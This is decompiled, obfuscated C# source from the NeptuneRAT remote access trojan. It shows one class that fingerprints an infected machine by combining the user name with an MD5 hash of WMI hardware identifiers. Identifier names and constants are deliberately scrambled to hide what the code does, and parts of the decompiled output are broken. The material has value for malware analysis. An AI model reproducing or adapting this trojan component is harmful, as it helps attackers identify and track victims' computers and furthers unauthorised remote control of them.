// Decompiled with JetBrains decompiler
// Type: NeptuneRAT.HashG
// Assembly: NeptuneRAT Free Version V2, Version=2.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 48C579C5-C5A1-4244-9537-C19C9217B961
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Tools\NeptuneRAT\NeptuneRAT.7z\neptunerat.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Management;
using System.Security.Cryptography;
using System.Text;

#nullable disable
namespace NeptuneRAT;

public class HashG
{
  public static object \u2694️MasonRAT\u270Cـ\u060Dٽـڞ\u060F\u060D\u060Aم\u060Aﻼـ\u0609\u060Bٺ\u060D\u060Fــﻋ()
  {
    object obj;
    try
    {
      obj = Operators.ConcatenateObject(Operators.ConcatenateObject(HashG.\u2694️MasonRAT\u270Cﯧـڙڙۨـڜدۜ\u060Aٸـ\u0608\u0609\u0609\u060Aمڝ\u0609(), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3846)), (object) HashG.\u2694️MasonRAT\u270C\u060Bﻼڙۙٺـ\u060C\u060B\u060D\u060Dڇ\u060Aٺ\u060B());
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      obj = (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3847);
      ProjectData.ClearProjectError();
    }
    return obj;
  }

  public static object \u2694️MasonRAT\u270Cﯧـڙڙۨـڜدۜ\u060Aٸـ\u0608\u0609\u0609\u060Aمڝ\u0609()
  {
    object obj;
    try
    {
      obj = (object) Environment.UserName;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      obj = (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3848);
      ProjectData.ClearProjectError();
    }
    return obj;
  }

  public static string \u2694️MasonRAT\u270C\u060Bﻼڙۙٺـ\u060C\u060B\u060D\u060Dڇ\u060Aٺ\u060B()
  {
    string str;
    try
    {
      str = HashG.\u2694️MasonRAT\u270C\u060A\u060Dٺٸ\u0608ۡـټدﻋ\u0608ـڙ\u0609ـ\u060C\u060Bم(HashG.\u2694️MasonRAT\u270Cـڞۧﻻۡــ\u060Eـڦ\u060Aڙ\u060B\u060Bۏ̍\u0608ڜ\u0609(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3849), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3850)) + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3851) + HashG.\u2694️MasonRAT\u270Cـڞۧﻻۡــ\u060Eـڦ\u060Aڙ\u060B\u060Bۏ̍\u0608ڜ\u0609(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3852), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3853)) + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3854) + HashG.\u2694️MasonRAT\u270Cـڞۧﻻۡــ\u060Eـڦ\u060Aڙ\u060B\u060Bۏ̍\u0608ڜ\u0609(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3855), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3856)) + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3857) + HashG.\u2694️MasonRAT\u270Cـڞۧﻻۡــ\u060Eـڦ\u060Aڙ\u060B\u060Bۏ̍\u0608ڜ\u0609(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3858), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3859)));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3860);
      ProjectData.ClearProjectError();
    }
    return str;
  }

  private static string \u2694️MasonRAT\u270Cـڞۧﻻۡــ\u060Eـڦ\u060Aڙ\u060B\u060Bۏ̍\u0608ڜ\u0609(
    string wmiClass,
    string wmiProperty)
  {
    string str;
    try
    {
      string Left = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3861);
      ManagementObjectCollection instances = new ManagementClass(wmiClass).GetInstances();
      try
      {
        foreach (ManagementObject managementObject in instances)
        {
          if (Operators.CompareString(Left, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3862), false) == 0)
          {
            try
            {
              Left = managementObject[wmiProperty].ToString();
              break;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
      }
      finally
      {
        ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
        objectEnumerator?.Dispose();
      }
      str = Left;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3863);
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public static string \u2694️MasonRAT\u270C\u060A\u060Dٺٸ\u0608ۡـټدﻋ\u0608ـڙ\u0609ـ\u060C\u060Bم(
    string input)
  {
    string str;
    try
    {
      byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(input));
      StringBuilder stringBuilder = new StringBuilder();
      int num = checked (hash.Length - 1);
      int index = (1662144195 - -1776465765 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + (916567470 + -60210124 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) % ((313198188 | 1960125229) - 642445684 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0) - 0;
      while (index <= num)
      {
        stringBuilder.Append(hash[index].ToString(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3864)));
        checked { ++index; }
      }
      str = stringBuilder.ToString().ToUpper();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3865);
      ProjectData.ClearProjectError();
    }
    return str;
  }
}
